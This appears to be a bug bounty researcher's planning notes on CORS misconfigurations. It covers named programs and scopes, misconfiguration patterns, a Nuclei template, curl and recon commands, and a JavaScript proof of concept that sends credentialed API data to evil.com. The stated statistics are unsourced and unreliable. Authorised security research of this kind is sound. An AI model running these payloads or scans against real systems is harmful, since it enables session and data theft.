# CORS Bug Bounty Targets - 2026

**Research Date:** 2026-06-06
**Source:** Web Research + Bug Bounty Platforms

---

## 🎯 Top Programs for CORS Hunting

### High Priority (Large Scope + Good Payouts)

| Program | Platform | Scope | Est. Payout |
|---------|----------|-------|-------------|
| **Verizon Media (Yahoo)** | HackerOne | `*.yahoo.com`, `*.aol.com` | $500-2000 |
| **Uber** | HackerOne | `*.uber.com`, `*.ubercab.com` | $500-1500 |
| **PayPal** | HackerOne | `*.paypal.com`, `*.paypalobjects.com` | $500-2500 |
| **Salesforce** | Bugcrowd | `*.salesforce.com` | $500-2000 |
| **Nintendo** | HackerOne | `*.nintendo.net`, `*.nintendo.co.jp` | $500-1500 |
| **Shopify** | HackerOne | `*.shopify.com`, `*.myshopify.com` | $500-1500 |
| **Stripe** | HackerOne | `*.stripe.com`, `*.stripe.network` | $500-2500 |
| **Spotify** | HackerOne | `*.spotify.com` | $500-1500 |
| **GitLab** | HackerOne | `*.gitlab.com` | $500-2000 |
| **Dropbox** | HackerOne | `*.dropbox.com` | $500-2000 |
| **Discord** | HackerOne | `*.discord.com`, `*.discordapp.com` | $500-2000 |
| **Coinbase** | HackerOne | `*.coinbase.com` | $500-3000 |

---

## 📊 CORS Vulnerability Stats (2026)

- **23.1%** of accepted web findings on HackerOne are CORS-related
- **$2,340** average bounty for CORS with demonstrated impact (+45% from 2025)
- **Critical patterns:** Origin reflection + Credentials: true

---

## 🔥 Common CORS Misconfiguration Patterns

### 1. Origin Reflection (CRITICAL)
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```
**Impact:** Allows any site to make authenticated requests

### 2. Null Origin Allowlist (HIGH)
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
**Impact:** Can be exploited via sandboxed iframes, data: URLs

### 3. Regex Validation Flaws (HIGH)
**Bypass techniques:**
- `vulnerable.com.evil.com` passes `*.vulnerable.com`
- Missing regex anchors allow suffix attacks

### 4. Wildcard + Credentials (HIGH)
**What happens:** Some frameworks auto-convert `*` + credentials to origin reflection

### 5. Subdomain Trust (MEDIUM)
**Risk:** XSS on any subdomain can be chained to attack main API

---

## 🛠️ Tools for CORS Testing

### Nuclei CORS Template
```yaml
# custom-cors.yaml
id: cors-misconfiguration
info:
  name: CORS Misconfiguration
  author: SARAhack
  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/"
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/v1/"
      - "{{BaseURL}}/api/user"
      - "{{BaseURL}}/api/profile"
    headers:
      Origin: "https://evil.com"
    matchers:
      - type: regex
        part: header
        regex:
          - "Access-Control-Allow-Origin: (\*|https://evil\\.com)"
    # Note: After scan, manually verify exploitability with valid session
    # The header match alone is valid for initial finding
```

### Automated Scanning
```bash
# Nuclei CORS scan
nuclei -t custom-cors.yaml -l targets.txt -v

# CORScanner
python3 corscanner.py -d target.com

# Mass scan with httpx + grep
cat subdomains.txt | httpx -silent | grep -i "access-control" | head -20
```

### Manual Testing Commands
```bash
# Test 1: Origin reflection
curl -i "https://target.com/api" -H "Origin: https://evil.com" -H "Cookie: session=..."

# Test 2: Null origin
curl -i "https://target.com/api" -H "Origin: null"

# Test 3: Wildcard with credentials (check if framework auto-converts)
curl -i "https://target.com/api" -H "Origin: https://any.com" -H "Cookie: session=..."

# Test 4: Check for Vary: Origin header
curl -i "https://target.com/api" -H "Origin: https://test.com"
```

---

## 📋 Recommended Approach

### Step 1: Asset Discovery
```bash
# Find all subdomains
amass enum -passive -d uber.com
subfinder -d uber.com -silent | httpx -silent
```

### Step 2: CORS Scanning
```bash
# Scan with nuclei
nuclei -t custom-cors.yaml -l subdomains.txt -v

# Manual verification
echo "Testing target..."
```

### Step 3: Impact Demonstration
**To get bounty (not just Informative):**
1. Find authenticated endpoint
2. Show data exfiltration via CORS
3. Demonstrate CSRF token or PII theft

---

## 📅 Programs Already Targeted (from SARAhack.md)

- Stripe (CORS) - HIGH ✓
- Discord (CORS) - HIGH ✓
- Polygon (CORS) - HIGH ✓
- Avalanche (CORS) - HIGH ✓
- Coinbase (CORS) ✓
- Shopify (CORS) ✓
- Uber (CORS) ✓

---

## 🔍 New Targets to Hunt

### TODO: CORS Testing on These Programs

1. **Yahoo/Verizon Media** - Large scope, high payout potential
2. **PayPal** - Many subdomains, financial data
3. **Salesforce** - Enterprise scope, complex architecture
4. **Nintendo** - Gaming APIs, high reward
5. **Spotify** - Music API, user data
6. **GitLab** - Code hosting, access tokens

---

## 📝 Report Templates Available

- `reports/templates/cors_report.md` - CORS template
- `reports/templates/ssrf_report.md` - SSRF template  
- `reports/templates/idor_report.md` - IDOR template

---

## 🎯 How to Turn Informative → HIGH Bounty

### Impact Demonstration (Critical!)

**Informative Report:**
```
Found: Access-Control-Allow-Origin: * on /api/public
```

**HIGH Bounty Report:**
```
1. Found Origin reflection on /api/settings
2. Combined with valid session cookie
3. Demonstrated exfiltration of CSRF token:
   <script>
   fetch('https://target.com/api/settings', {
     credentials: 'include'
   })
   .then(r => r.json())
   .then(data => {
     // Send to attacker server
     document.location = 'https://evil.com/steal?data=' + btoa(JSON.stringify(data));
   });
   </script>
4. Impact: Attacker can read/modify user settings, including password change
```

### Key Attack Chains

| Attack | Prerequisites | Impact |
|--------|--------------|--------|
| **Session Reading** | Origin reflection + credentials | Steal session data |
| **CSRF Token Theft** | CORS on API + authenticated endpoint | CSRF attack |
| **PII Exfiltration** | CORS on user data endpoint | GDPR violation |
| **XSS + CORS** | Any XSS on trusted subdomain | Full account takeover |

### Endpoints to Test First
```
/api/user
/api/settings
/api/profile
/api/token
/api/auth
/graphql
/v1/accounts
/user/me
/profile/me
```

---

**Last Updated:** 2026-06-06